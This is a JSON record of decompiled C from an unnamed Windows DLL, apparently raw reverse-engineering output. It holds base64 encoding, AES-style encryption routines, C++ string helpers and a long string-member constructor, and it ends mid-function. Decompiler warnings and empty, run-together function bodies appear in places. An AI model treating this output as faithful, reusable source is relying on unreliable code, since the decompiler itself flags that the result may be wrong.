{
  "c_code": [
    "#include \"224933e6-46f1-4ec0-8521-947aa2e85a8f.h\"",
    "",
    "int sub_10001000()",
    "{",
    "  sub_100018C0(&dword_100408B0, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\", 0x40u);",
    "  return atexit(sub_1002F5B0);",
    "}",
    "",
    "",
    "int sub_10001020()",
    "{",
    "  return atexit(sub_1002F610);",
    "}",
    "",
    "",
    "char *sub_10001030()",
    "{",
    "  unsigned int v0; // edx",
    "  unsigned __int8 v1; // bl",
    "  char *v2; // esi",
    "  char *result; // eax",
    "  char v4; // ch",
    "  unsigned __int8 v5; // bh",
    "  int v6; // ecx",
    "  char v7; // bh",
    "  char v8; // cl",
    "  int v9; // [esp+8h] [ebp-8h]",
    "  char v10; // [esp+Dh] [ebp-3h]",
    "  char v11; // [esp+Eh] [ebp-2h]",
    "",
    "  v0 = 4;",
    "  byte_100408D0 = byte_1003FB40;",
    "  byte_100408D1 = byte_1003FB41;",
    "  byte_100408D2 = byte_1003FB42;",
    "  byte_100408D3 = byte_1003FB43;",
    "  byte_100408D4 = byte_1003FB44;",
    "  byte_100408D5 = byte_1003FB45;",
    "  byte_100408D6 = byte_1003FB46;",
    "  byte_100408D7 = byte_1003FB47;",
    "  byte_100408D8 = byte_1003FB48;",
    "  byte_100408D9 = byte_1003FB49;",
    "  byte_100408DA = byte_1003FB4A;",
    "  byte_100408DB = byte_1003FB4B;",
    "  byte_100408DC = byte_1003FB4C;",
    "  v1 = byte_1003FB4D;",
    "  byte_100408DE = byte_1003FB4E;",
    "  byte_100408DD = byte_1003FB4D;",
    "  v2 = &byte_100408DD;",
    "  byte_100408DF = byte_1003FB4F;",
    "  v9 = 4;",
    "  do",
    "  {",
    "    result = v2;",
    "    v4 = v2[2];",
    "    v5 = *(v2 - 1);",
    "    v11 = v1;",
    "    v10 = v2[1];",
    "    if ( (v0 & 3) == 0 )",
    "    {",
    "      v11 = byte_10036C88[(unsigned __int8)v2[1]];",
    "      v10 = byte_10036C88[(unsigned __int8)v2[2]];",
    "      v6 = v5;",
    "      v7 = byte_10036A88[v0 >> 2];",
    "      v0 = v9;",
    "      v5 = byte_10036C88[v1] ^ v7;",
    "      v4 = byte_10036C88[v6];",
    "    }",
    "    v2 += 4;",
    "    v1 = v11 ^ *(result - 12);",
    "    ++v0;",
    "    result[3] = v5 ^ *(result - 13);",
    "    result[5] = v10 ^ *(result - 11);",
    "    v8 = v4 ^ *(result - 10);",
    "    result[4] = v1;",
    "    result[6] = v8;",
    "    v9 = v0;",
    "  }",
    "  while ( v0 < 0x2C );",
    "  return result;",
    "}",
    "",
    "",
    "unsigned __int8 sub_100011A0()",
    "{",
    "  unsigned __int8 *v0; // esi",
    "  int v1; // ebx",
    "  _BYTE *v2; // ecx",
    "  char *v3; // edi",
    "  int v4; // edx",
    "  unsigned __int8 *v5; // ebx",
    "  unsigned __int8 *v6; // ecx",
    "  int v7; // edx",
    "  int v8; // eax",
    "  int v9; // edi",
    "  unsigned __int8 v10; // cl",
    "  unsigned __int8 v11; // al",
    "  unsigned __int8 v12; // cl",
    "  unsigned __int8 v13; // al",
    "  unsigned __int8 v14; // cl",
    "  unsigned __int8 v15; // al",
    "  unsigned __int8 v16; // cl",
    "  _BYTE *v17; // esi",
    "  char v18; // bh",
    "  char v19; // ch",
    "  char v20; // dl",
    "  char v21; // dh",
    "  int v22; // ebx",
    "  char *v23; // edi",
    "  _BYTE *v24; // eax",
    "  int v25; // edx",
    "  char v26; // cl",
    "  unsigned __int8 *v27; // edi",
    "  int v28; // ebx",
    "  unsigned __int8 *v29; // ecx",
    "  int v30; // edx",
    "  int v31; // eax",
    "  int v32; // edi",
    "  unsigned __int8 v33; // cl",
    "  int v34; // edx",
    "  unsigned __int8 v35; // al",
    "  unsigned __int8 v36; // cl",
    "  unsigned __int8 v37; // al",
    "  unsigned __int8 v38; // cl",
    "  unsigned __int8 v39; // al",
    "  unsigned __int8 v40; // cl",
    "  int v41; // ecx",
    "  unsigned __int8 result; // al",
    "  int v43; // [esp+Ch] [ebp-10h]",
    "  char *v44; // [esp+10h] [ebp-Ch]",
    "  int v45; // [esp+14h] [ebp-8h]",
    "  char v46; // [esp+1Bh] [ebp-1h]",
    "",
    "  v0 = (unsigned __int8 *)dword_100408C8;",
    "  v1 = 4;",
    "  v2 = (_BYTE *)dword_100408C8;",
    "  v3 = &byte_100408D0[-dword_100408C8];",
    "  do",
    "  {",
    "    v4 = 4;",
    "    do",
    "    {",
    "      *v2 ^= v2[(_DWORD)v3];",
    "      ++v2;",
    "      --v4;",
    "    }",
    "    while ( v4 );",
    "    --v1;",
    "  }",
    "  while ( v1 );",
    "  v43 = 9;",
    "  v44 = (char *)&unk_100408E0;",
    "  do",
    "  {",
    "    v5 = v0;",
    "    v45 = 4;",
    "    do",
    "    {",
    "      v6 = v5;",
    "      v7 = 4;",
    "      do",
    "      {",
    "        v8 = *v6;",
    "        v6 += 4;",
    "        *(v6 - 4) = byte_10036C88[v8];",
    "        --v7;",
    "      }",
    "      while ( v7 );",
    "      ++v5;",
    "      --v45;",
    "    }",
    "    while ( v45 );",
    "    v9 = 4;",
    "    v10 = v0[1];",
    "    v0[1] = v0[5];",
    "    v0[5] = v0[9];",
    "    v0[9] = v0[13];",
    "    v11 = v0[10];",
    "    v0[13] = v10;",
    "    v12 = v0[2];",
    "    v0[2] = v11;",
    "    v13 = v0[14];",
    "    v0[10] = v12;",
    "    v14 = v0[6];",
    "    v0[6] = v13;",
    "    v15 = v0[15];",
    "    v0[14] = v14;",
    "    v16 = v0[3];",
    "    v0[3] = v15;",
    "    v0[15] = v0[11];",
    "    v0[11] = v0[7];",
    "    v0[7] = v16;",
    "    v17 = v0 + 2;",
    "    do",
    "    {",
    "      v18 = v17[1];",
    "      v17 += 4;",
    "      v19 = *(v17 - 4);",
    "      v20 = *(v17 - 5);",
    "      v46 = *(v17 - 6);",
    "      v21 = v20 ^ v46 ^ v19 ^ v18;",
    "      *(v17 - 6) = v21 ^ v46 ^ (2 * (v20 ^ v46)) ^ (27 * ((unsigned __int8)(v20 ^ v46) >> 7));",
    "      *(v17 - 5) = v21 ^ v20 ^ (2 * (v19 ^ v20)) ^ (27 * ((unsigned __int8)(v19 ^ v20) >> 7));",
    "      *(v17 - 4) = v21 ^ v19 ^ (2 * (v19 ^ v18)) ^ (27 * ((unsigned __int8)(v19 ^ v18) >> 7));",
    "      *(v17 - 3) = v21 ^ v18 ^ (2 * (v18 ^ v46)) ^ (27 * ((unsigned __int8)(v18 ^ v46) >> 7));",
    "      --v9;",
    "    }",
    "    while ( v9 );",
    "    v0 = (unsigned __int8 *)dword_100408C8;",
    "    v22 = 4;",
    "    v23 = v44;",
    "    v24 = (_BYTE *)dword_100408C8;",
    "    do",
    "    {",
    "      v25 = 4;",
    "      do",
    "      {",
    "        v26 = *v23++;",
    "        *v24++ ^= v26;",
    "        --v25;",
    "      }",
    "      while ( v25 );",
    "      v44 = v23;",
    "      --v22;",
    "    }",
    "    while ( v22 );",
    "    --v43;",
    "  }",
    "  while ( v43 );",
    "  v27 = v0;",
    "  v28 = 4;",
    "  do",
    "  {",
    "    v29 = v27;",
    "    v30 = 4;",
    "    do",
    "    {",
    "      v31 = *v29;",
    "      v29 += 4;",
    "      *(v29 - 4) = byte_10036C88[v31];",
    "      --v30;",
    "    }",
    "    while ( v30 );",
    "    ++v27;",
    "    --v28;",
    "  }",
    "  while ( v28 );",
    "  v32 = 4;",
    "  v33 = v0[1];",
    "  v0[1] = v0[5];",
    "  v34 = &unk_10040970 - (_UNKNOWN *)v0;",
    "  v0[5] = v0[9];",
    "  v0[9] = v0[13];",
    "  v35 = v0[10];",
    "  v0[13] = v33;",
    "  v36 = v0[2];",
    "  v0[2] = v35;",
    "  v37 = v0[14];",
    "  v0[10] = v36;",
    "  v38 = v0[6];",
    "  v0[6] = v37;",
    "  v39 = v0[15];",
    "  v0[14] = v38;",
    "  v40 = v0[3];",
    "  v0[3] = v39;",
    "  v0[15] = v0[11];",
    "  v0[11] = v0[7];",
    "  v0[7] = v40;",
    "  do",
    "  {",
    "    v41 = 4;",
    "    do",
    "    {",
    "      result = v0[v34];",
    "      *v0++ ^= result;",
    "      --v41;",
    "    }",
    "    while ( v41 );",
    "    --v32;",
    "  }",
    "  while ( v32 );",
    "  return result;",
    "}",
    "",
    "",
    "char *__thiscall sub_100013F0(char *this, int a2)",
    "{",
    "  *(_DWORD *)this = &std::exception::`vftable';",
    "  *(_QWORD *)(this + 4) = 0;",
    "  __std_exception_copy(a2 + 4, this + 4);",
    "  return this;",
    "}",
    "",
    "",
    "const char *__thiscall sub_10001420(_DWORD *this)",
    "{",
    "  int v1; // ecx",
    "  const char *result; // eax",
    "",
    "  v1 = this[1];",
    "  result = \"Unknown exception\";",
    "  if ( v1 )",
    "    return (const char *)v1;",
    "  return result;",
    "}",
    "",
    "",
    "char *__thiscall sub_10001430(char *Block, char a2)",
    "{",
    "  *(_DWORD *)Block = &std::exception::`vftable';",
    "  __std_exception_destroy(Block + 4);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_100154EB(Block);",
    "  return Block;",
    "}",
    "",
    "",
    "// Microsoft VisualC 14/net runtime",
    "int __thiscall unknown_libname_1(_DWORD *this)",
    "{",
    "}char *__thiscall sub_10001480(char *this)",
    "{",
    "  char *result; // eax",
    "",
    "  result = this;",
    "  *(_QWORD *)(this + 4) = 0;",
    "  *((_DWORD *)this + 1) = \"bad array new length\";",
    "  *(_DWORD *)this = &std::bad_array_new_length::`vftable';",
    "  return result;",
    "}",
    "",
    "",
    "void  sub_100014A0()",
    "{",
    "  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF",
    "",
    "  sub_10001480(pExceptionObject);",
    "  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVbad_array_new_length_std__);",
    "}",
    "",
    "",
    "char *__thiscall sub_100014C0(char *this, int a2)",
    "{",
    "  *(_DWORD *)this = &std::exception::`vftable';",
    "  *(_QWORD *)(this + 4) = 0;",
    "  __std_exception_copy(a2 + 4, this + 4);",
    "  *(_DWORD *)this = &std::bad_array_new_length::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "char *__thiscall sub_10001500(char *this, int a2)",
    "{",
    "  *(_DWORD *)this = &std::exception::`vftable';",
    "  *(_QWORD *)(this + 4) = 0;",
    "  __std_exception_copy(a2 + 4, this + 4);",
    "  *(_DWORD *)this = &std::bad_alloc::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "void  sub_10001540()",
    "{",
    "  sub_10014CD2(\"string too long\");",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_10001550(_DWORD *Src, char *a2, int a3)",
    "{",
    "  int v3; // eax",
    "  int v4; // esi",
    "  char v6; // al",
    "  unsigned __int8 v7; // dl",
    "  unsigned __int8 v8; // dh",
    "  int v9; // esi",
    "  void **v10; // ecx",
    "  unsigned int v11; // edx",
    "  char v12; // al",
    "  unsigned int v13; // ecx",
    "  _DWORD *v14; // eax",
    "  char *v15; // eax",
    "  char v16; // cl",
    "  int v17; // eax",
    "  bool v18; // cf",
    "  unsigned __int8 v19; // cl",
    "  int v20; // esi",
    "  void **v21; // ecx",
    "  unsigned int v22; // edx",
    "  char v23; // al",
    "  unsigned int v24; // ecx",
    "  _DWORD *v25; // eax",
    "  char *v26; // eax",
    "  char v27; // cl",
    "  unsigned int v28; // ecx",
    "  unsigned int v29; // edx",
    "  _DWORD *v30; // eax",
    "  int v32; // [esp+14h] [ebp-24h]",
    "  int v33; // [esp+18h] [ebp-20h]",
    "  int v34; // [esp+18h] [ebp-20h]",
    "  int v35; // [esp+18h] [ebp-20h]",
    "  unsigned __int8 v36; // [esp+1Dh] [ebp-1Bh]",
    "  __int16 v37; // [esp+1Eh] [ebp-1Ah]",
    "  char v38; // [esp+20h] [ebp-18h]",
    "  char v39; // [esp+21h] [ebp-17h]",
    "  char v40; // [esp+22h] [ebp-16h]",
    "  char v41; // [esp+23h] [ebp-15h]",
    "  int v42; // [esp+24h] [ebp-14h]",
    "  char v43[4]; // [esp+28h] [ebp-10h]",
    "  int v44; // [esp+34h] [ebp-4h]",
    "  char *v45; // [esp+44h] [ebp+Ch]",
    "  int v46; // [esp+48h] [ebp+10h]",
    "",
    "  *(_OWORD *)Src = 0;",
    "  Src[4] = 0;",
    "  Src[5] = 0;",
    "  Src[4] = 0;",
    "  Src[5] = 15;",
    "  *(_BYTE *)Src = 0;",
    "  v3 = a3;",
    "  v4 = 0;",
    "  v44 = 0;",
    "  if ( a3 )",
    "  {",
    "    do",
    "    {",
    "      v46 = v3 - 1;",
    "      v6 = *a2++;",
    "      v43[v4++ - 4] = v6;",
    "      v7 = BYTE1(v42);",
    "      v8 = v42;",
    "      v45 = a2;",
    "      v36 = BYTE2(v42);",
    "      v37 = v42;",
    "      if ( v4 == 3 )",
    "      {",
    "        v38 = (unsigned __int8)v42 >> 2;",
    "        v39 = (BYTE1(v42) >> 4) + 16 * (v42 & 3);",
    "        v41 = BYTE2(v42) & 0x3F;",
    "        v9 = 0;",
    "        v40 = (BYTE2(v42) >> 6) + 4 * (BYTE1(v42) & 0xF);",
    "        do",
    "        {",
    "          v10 = &dword_100408B0;",
    "          if ( (unsigned int)dword_100408C4 > 0xF )",
    "            v10 = (void **)dword_100408B0;",
    "          v11 = Src[5];",
    "          v12 = *((_BYTE *)v10 + (unsigned __int8)*(&v38 + v9));",
    "          v13 = Src[4];",
    "          v43[0] = v12;",
    "          if ( v13 >= v11 )",
    "          {",
    "            LOBYTE(v33) = 0;",
    "            sub_100019A0(Src, v13, v33, v43[0]);",
    "          }",
    "          else",
    "          {",
    "            Src[4] = v13 + 1;",
    "            v14 = Src;",
    "            if ( v11 > 0xF )",
    "              v14 = (_DWORD *)*Src;",
    "            v15 = (char *)v14 + v13;",
    "            v16 = v43[0];",
    "            v15[1] = 0;",
    "            *v15 = v16;",
    "          }",
    "          ++v9;",
    "        }",
    "        while ( v9 < 4 );",
    "        a2 = v45;",
    "        v4 = 0;",
    "        v7 = HIBYTE(v37);",
    "        v8 = v37;",
    "      }",
    "      v3 = v46;",
    "    }",
    "    while ( v46 );",
    "    v34 = v4;",
    "    if ( v4 )",
    "    {",
    "      v17 = v4;",
    "      if ( v4 >= 3 )",
    "      {",
    "        v19 = v36;",
    "      }",
    "      else",
    "      {",
    "        v18 = (unsigned int)v4 < 3;",
    "        do",
    "        {",
    "          if ( !v18 )",
    "            sub_10015989(a2);",
    "          v43[v17++ - 4] = 0;",
    "          v18 = (unsigned int)v17 < 3;",
    "        }",
    "        while ( v17 < 3 );",
    "        v19 = BYTE2(v42);",
    "        v7 = BYTE1(v42);",
    "        v8 = v42;",
    "      }",
    "      v38 = v8 >> 2;",
    "      v39 = (v7 >> 4) + 16 * (v8 & 3);",
    "      v41 = v19 & 0x3F;",
    "      v40 = (v19 >> 6) + 4 * (v7 & 0xF);",
    "      v42 = v4 + 1;",
    "      if ( v4 + 1 > 0 )",
    "      {",
    "        v20 = 0;",
    "        do",
    "        {",
    "          v21 = &dword_100408B0;",
    "          if ( (unsigned int)dword_100408C4 > 0xF )",
    "            v21 = (void **)dword_100408B0;",
    "          v22 = Src[5];",
    "          v23 = *((_BYTE *)v21 + (unsigned __int8)*(&v38 + v20));",
    "          v24 = Src[4];",
    "          v43[0] = v23;",
    "          if ( v24 >= v22 )",
    "          {",
    "            LOBYTE(v32) = 0;",
    "            sub_100019A0(Src, v24, v32, v43[0]);",
    "          }",
    "          else",
    "          {",
    "            Src[4] = v24 + 1;",
    "            v25 = Src;",
    "            if ( v22 > 0xF )",
    "              v25 = (_DWORD *)*Src;",
    "            v26 = (char *)v25 + v24;",
    "            v27 = v43[0];",
    "            v26[1] = 0;",
    "            *v26 = v27;",
    "          }",
    "          ++v20;",
    "        }",
    "        while ( v20 < v42 );",
    "        v4 = v34;",
    "      }",
    "      if ( v4 < 3 )",
    "      {",
    "        v35 = 3 - v4;",
    "        do",
    "        {",
    "          v28 = Src[4];",
    "          v29 = Src[5];",
    "          if ( v28 >= v29 )",
    "          {",
    "            LOBYTE(v32) = 0;",
    "            sub_100019A0(Src, v28, v32, 61);",
    "          }",
    "          else",
    "          {",
    "            Src[4] = v28 + 1;",
    "            v30 = Src;",
    "            if ( v29 > 0xF )",
    "              v30 = (_DWORD *)*Src;",
    "            *(_WORD *)((char *)v30 + v28) = 61;",
    "          }",
    "          --v35;",
    "        }",
    "        while ( v35 );",
    "      }",
    "    }",
    "  }",
    "  return Src;",
    "}",
    "",
    "",
    "void __thiscall sub_100017E0(_DWORD *this)",
    "{",
    "  unsigned int v2; // ecx",
    "  _DWORD *v3; // eax",
    "",
    "  v2 = this[5];",
    "  if ( v2 > 0xF )",
    "  {",
    "    v3 = (_DWORD *)*this;",
    "    if ( v2 + 1 >= 0x1000 )",
    "    {",
    "      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "      v3 = (_DWORD *)*(v3 - 1);",
    "    }",
    "    sub_100154EB(v3);",
    "  }",
    "  this[4] = 0;",
    "  this[5] = 15;",
    "  *(_BYTE *)this = 0;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_10001830(_DWORD *this, int a2)",
    "{",
    "  *(_OWORD *)this = 0;",
    "  this[4] = 0;",
    "  this[5] = 0;",
    "  *(_OWORD *)this = *(_OWORD *)a2;",
    "  *((_QWORD *)this + 2) = *(_QWORD *)(a2 + 16);",
    "  *(_DWORD *)(a2 + 16) = 0;",
    "  *(_DWORD *)(a2 + 20) = 15;",
    "  *(_BYTE *)a2 = 0;",
    "  return this;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_10001880(_DWORD *this, void *Src)",
    "{",
    "  *(_OWORD *)this = 0;",
    "  this[4] = 0;",
    "  this[5] = 0;",
    "  sub_100018C0(this, Src, strlen((const char *)Src));",
    "  return this;",
    "}",
    "",
    "",
    "void *__thiscall sub_100018C0(_DWORD *this, void *Src, size_t Size)",
    "{",
    "  void *result; // eax",
    "  size_t v5; // edi",
    "  size_t v6; // ecx",
    "  void *v7; // eax",
    "  void *v8; // ecx",
    "  _DWORD *v9; // eax",
    "  void *v10; // [esp+10h] [ebp-4h]",
    "",
    "  if ( Size > 0x7FFFFFFF )",
    "    sub_10001540();",
    "  if ( Size <= 0xF )",
    "  {",
    "    this[4] = Size;",
    "    this[5] = 15;",
    "    result = memmove(this, Src, Size);",
    "    *((_BYTE *)this + Size) = 0;",
    "    return result;",
    "  }",
    "  v5 = Size | 0xF;",
    "  if ( (Size | 0xF) > 0x7FFFFFFF )",
    "  {",
    "    v5 = 0x7FFFFFFF;",
    "    v6 = -2147483613;",
    "LABEL_6:",
    "    v7 = operator new(v6);",
    "    v8 = v7;",
    "    if ( !v7 )",
    "      _invalid_parameter_noinfo_noreturn();",
    "    v9 = (_DWORD *)(((unsigned int)v7 + 35) & 0xFFFFFFE0);",
    "    *(v9 - 1) = v8;",
    "    goto LABEL_15;",
    "  }",
    "  if ( v5 < 0x16 )",
    "    v5 = 22;",
    "  v9 = (_DWORD *)(v5 + 1);",
    "  if ( v5 == -1 )",
    "    goto LABEL_15;",
    "  if ( (unsigned int)v9 >= 0x1000 )",
    "  {",
    "    v6 = v5 + 36;",
    "    if ( v5 + 36 < v5 + 1 )",
    "      sub_100014A0();",
    "    goto LABEL_6;",
    "  }",
    "  v9 = operator new(v5 + 1);",
    "LABEL_15:",
    "  v10 = v9;",
    "  *this = v9;",
    "  this[4] = Size;",
    "  this[5] = v5;",
    "  memmove(v9, Src, Size);",
    "  result = v10;",
    "  *((_BYTE *)v10 + Size) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_100019A0(void **Src, int a2, int a3, char a4)",
    "{",
    "}BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)",
    "{",
    "  return 1;",
    "}",
    "",
    "",
    "_OWORD *__thiscall sub_10001AF0(_OWORD *this)",
    "{",
    "  void *v1; // edi",
    "  void *v2; // esi",
    "",
    "  *this = 0;",
    "  *((_DWORD *)this + 4) = 0;",
    "  *((_DWORD *)this + 5) = 0;",
    "  *((_DWORD *)this + 4) = 0;",
    "  *((_DWORD *)this + 5) = 15;",
    "  *(_BYTE *)this = 0;",
    "  *(_OWORD *)((char *)this + 24) = 0;",
    "  *((_DWORD *)this + 10) = 0;",
    "  *((_DWORD *)this + 11) = 15;",
    "  *((_BYTE *)this + 24) = 0;",
    "  this[3] = 0;",
    "  *((_DWORD *)this + 16) = 0;",
    "  *((_DWORD *)this + 17) = 15;",
    "  *((_BYTE *)this + 48) = 0;",
    "  *(_OWORD *)((char *)this + 72) = 0;",
    "  *((_DWORD *)this + 22) = 0;",
    "  *((_DWORD *)this + 23) = 15;",
    "  *((_BYTE *)this + 72) = 0;",
    "  this[6] = 0;",
    "  *((_DWORD *)this + 28) = 0;",
    "  *((_DWORD *)this + 29) = 15;",
    "  *((_BYTE *)this + 96) = 0;",
    "  *(_OWORD *)((char *)this + 120) = 0;",
    "  *((_DWORD *)this + 34) = 0;",
    "  *((_DWORD *)this + 35) = 15;",
    "  *((_BYTE *)this + 120) = 0;",
    "  this[9] = 0;",
    "  *((_DWORD *)this + 40) = 0;",
    "  *((_DWORD *)this + 41) = 15;",
    "  *((_BYTE *)this + 144) = 0;",
    "  *(_OWORD *)((char *)this + 168) = 0;",
    "  *((_DWORD *)this + 46) = 0;",
    "  *((_DWORD *)this + 47) = 15;",
    "  *((_BYTE *)this + 168) = 0;",
    "  this[12] = 0;",
    "  *((_DWORD *)this + 52) = 0;",
    "  *((_DWORD *)this + 53) = 15;",
    "  *((_BYTE *)this + 192) = 0;",
    "  *(_OWORD *)((char *)this + 216) = 0;",
    "  *((_DWORD *)this + 58) = 0;",
    "  *((_DWORD *)this + 59) = 15;",
    "  *((_BYTE *)this + 216) = 0;",
    "  this[15] = 0;",
    "  *((_DWORD *)this + 64) = 0;",
    "  *((_DWORD *)this + 65) = 15;",
    "  *((_BYTE *)this + 240) = 0;",
    "  *(_OWORD *)((char *)this + 264) = 0;",
    "  *((_DWORD *)this + 70) = 0;",
    "  *((_DWORD *)this + 71) = 15;",
    "  *((_BYTE *)this + 264) = 0;",
    "  this[18] = 0;",
    "  *((_DWORD *)this + 76) = 0;",
    "  *((_DWORD *)this + 77) = 15;",
    "  *((_BYTE *)this + 288) = 0;",
    "  *(_OWORD *)((char *)this + 312) = 0;",
    "  *((_DWORD *)this + 82) = 0;",
    "  *((_DWORD *)this + 83) = 15;",
    "  *((_BYTE *)this + 312) = 0;",
    "  this[21] = 0;",
    "  *((_DWORD *)this + 88) = 0;",
    "  *((_DWORD *)this + 89) = 15;",
    "  *((_BYTE *)this + 336) = 0;",
    "  *(_OWORD *)((char *)this + 360) = 0;",
    "  *((_DWORD *)this + 94) = 0;",
    "  *((_DWORD *)this + 95) = 15;",
    "  *((_BYTE *)this + 360) = 0;",
    "  this[24] = 0;",
    "  *((_DWORD *)this + 100) = 0;",
    "  *((_DWORD *)this + 101) = 15;",
    "  *((_BYTE *)this + 384) = 0;",
    "  *(_OWORD *)((char *)this + 408) = 0;",
    "  *((_DWORD *)this + 106) = 0;",
    "  *((_DWORD *)this + 107) = 15;",
    "  *((_BYTE *)this + 408) = 0;",
    "  this[27] = 0;",
    "  *((_DWORD *)this + 112) = 0;",
    "  *((_DWORD *)this + 113) = 15;",
    "  *((_BYTE *)this + 432) = 0;",
    "  *(_OWORD *)((char *)this + 456) = 0;",
    "  *((_DWORD *)this + 118) = 0;",
    "  *((_DWORD *)this + 119) = 15;",
    "  *((_BYTE *)this + 456) = 0;",
    "  this[30] = 0;",
    "  *((_DWORD *)this + 124) = 0;",
    "  *((_DWORD *)this + 125) = 15;",
    "  *((_BYTE *)this + 480) = 0;",
    "  *(_OWORD *)((char *)this + 504) = 0;",
    "  *((_DWORD *)this + 130) = 0;",
    "  *((_DWORD *)this + 131) = 15;",
    "  *((_BYTE *)this + 504) = 0;",
    "  this[33] = 0;",
    "  *((_DWORD *)this + 136) = 0;",
    "  *((_DWORD *)this + 137) = 15;",
    "  *((_BYTE *)this + 528) = 0;",
    "  *(_OWORD *)((char *)this + 552) = 0;",
    "  *((_DWORD *)this + 142) = 0;",
    "  *((_DWORD *)this + 143) = 15;",
    "  *((_BYTE *)this + 552) = 0;",
    "  this[36] = 0;",
    "  *((_DWORD *)this + 148) = 0;",
    "  *((_DWORD *)this + 149) = 15;",
    "  *((_BYTE *)this + 576) = 0;",
    "  *(_OWORD *)((char *)this + 600) = 0;",
    "  *((_DWORD *)this + 154) = 0;",
    "  *((_DWORD *)this + 155) = 15;",
    "  *((_BYTE *)this + 600) = 0;",
    "  this[39] = 0;",
    "  *((_DWORD *)this + 160) = 0;",
    "  *((_DWORD *)this + 161) = 15;",
    "  *((_BYTE *)this + 624) = 0;",
    "  *(_OWORD *)((char *)this + 648) = 0;",
    "  *((_DWORD *)this + 166) = 0;",
    "  *((_DWORD *)this + 167) = 15;",
    "  *((_BYTE *)this + 648) = 0;",
    "  this[42] = 0;",
    "  *((_DWORD *)this + 172) = 0;",
    "  *((_DWORD *)this + 173) = 15;",
    "  *((_BYTE *)this + 672) = 0;",
    "  *(_OWORD *)((char *)this + 696) = 0;",
    "  *((_DWORD *)this + 178) = 0;",
    "  *((_DWORD *)this + 179) = 15;",
    "  *((_BYTE *)this + 696) = 0;",
    "  this[45] = 0;",
    "  *((_DWORD *)this + 184) = 0;",
    "  *((_DWORD *)this + 185) = 15;",
    "  *((_BYTE *)this + 720) = 0;",
    "  *(_OWORD *)((char *)this + 744) = 0;",
    "  *((_DWORD *)this + 190) = 0;",
    "  *((_DWORD *)this + 191) = 15;",
    "  *((_BYTE *)this + 744) = 0;",
    "  this[48] = 0;",
    "  *((_DWORD *)this + 196) = 0;",
    "  *((_DWORD *)this + 197) = 15;",
    "  *((_BYTE *)this + 768) = 0;",
    "  *(_OWORD *)((char *)this + 792) = 0;",
    "  *((_DWORD *)this + 202) = 0;",
    "  *((_DWORD *)this + 203) = 15;",
    "  *((_BYTE *)this + 792) = 0;",
    "  this[51] = 0;",
    "  *((_DWORD *)this + 208) = 0;",
    "  *((_DWORD *)this + 209) = 15;",
    "  *((_BYTE *)this + 816) = 0;",
    "  *(_OWORD *)((char *)this + 840) = 0;",
    "  *((_DWORD *)this + 214) = 0;",
    "  *((_DWORD *)this + 215) = 15;",
    "  *((_BYTE *)this + 840) = 0;",
    "  this[54] = 0;",
    "  *((_DWORD *)this + 220) = 0;",
    "  *((_DWORD *)this + 221) = 15;",
    "  *((_BYTE *)this + 864) = 0;",
    "  *(_OWORD *)((char *)this + 888) = 0;",
    "  *((_DWORD *)this + 226) = 0;",
    "  *((_DWORD *)this + 227) = 15;",
    "  *((_BYTE *)this + 888) = 0;",
    "  this[57] = 0;",
    "  *((_DWORD *)this + 232) = 0;",
    "  *((_DWORD *)this + 233) = 15;",
    "  *((_BYTE *)this + 912) = 0;",
    "  *(_OWORD *)((char *)this + 936) = 0;",
    "  *((_DWORD *)this + 238) = 0;",
    "  *((_DWORD *)this + 239) = 15;",
    "  *((_BYTE *)this + 936) = 0;",
    "  this[60] = 0;",
    "  *((_DWORD *)this + 244) = 0;",
    "  *((_DWORD *)this + 245) = 15;",
    "  *((_BYTE *)this + 960) = 0;",
    "  *(_OWORD *)((char *)this + 984) = 0;",
    "  *((_DWORD *)this + 250) = 0;",
    "  *((_DWORD *)this + 251) = 15;",
    "  *((_BYTE *)this + 984) = 0;",
    "  this[63] = 0;",
    "  *((_DWORD *)this + 256) = 0;",
    "  *((_DWORD *)this + 257) = 15;",
    "  *((_BYTE *)this + 1008) = 0;",
    "  *(_OWORD *)((char *)this + 1032) = 0;",
    "  *((_DWORD *)this + 262) = 0;",
    "  *((_DWORD *)this + 263) = 15;",
    "  *((_BYTE *)this + 1032) = 0;",
    "  this[66] = 0;",
    "  *((_DWORD *)this + 268) = 0;",
    "  *((_DWORD *)this + 269) = 15;",
    "  *((_BYTE *)this + 1056) = 0;",
    "  *(_OWORD *)((char *)this + 1080) = 0;",
    "  *((_DWORD *)this + 274) = 0;",
    "  *((_DWORD *)this + 275) = 15;",
    "  *((_BYTE *)this + 1080) = 0;",
    "  this[69] = 0;",
    "  *((_DWORD *)this + 280) = 0;",
    "  *((_DWORD *)this + 281) = 15;",
    "  *((_BYTE *)this + 1104) = 0;",
    "  *(_OWORD *)((char *)this + 1128) = 0;",
    "  *((_DWORD *)this + 286) = 0;",
    "  *((_DWORD *)this + 287) = 15;",
    "  *((_BYTE *)this + 1128) = 0;",
    "  this[72] = 0;",
    "  *((_DWORD *)this + 292) = 0;",
    "  *((_DWORD *)this + 293) = 15;",
    "  *((_BYTE *)this + 1152) = 0;",
    "  *(_OWORD *)((char *)this + 1176) = 0;",
    "  *((_DWORD *)this + 298) = 0;",
    "  *((_DWORD *)this + 299) = 15;",
    "  *((_BYTE *)this + 1176) = 0;",
    "  this[75] = 0;",
    "  *((_DWORD *)this + 304) = 0;",
    "  *((_DWORD *)this + 305) = 15;",
    "  *((_BYTE *)this + 1200) = 0;",
    "  *(_OWORD *)((char *)this + 1224) = 0;",
    "  *((_DWORD *)this + 310) = 0;",
    "  *((_DWORD *)this + 311) = 15;",
    "  *((_BYTE *)this + 1224) = 0;",
    "  this[78] = 0;",
    "  *((_DWORD *)this + 316) = 0;",
    "  *((_DWORD *)this + 317) = 15;",
    "  *((_BYTE *)this + 1248) = 0;",
    "  *(_OWORD *)((char *)this + 1272) = 0;",
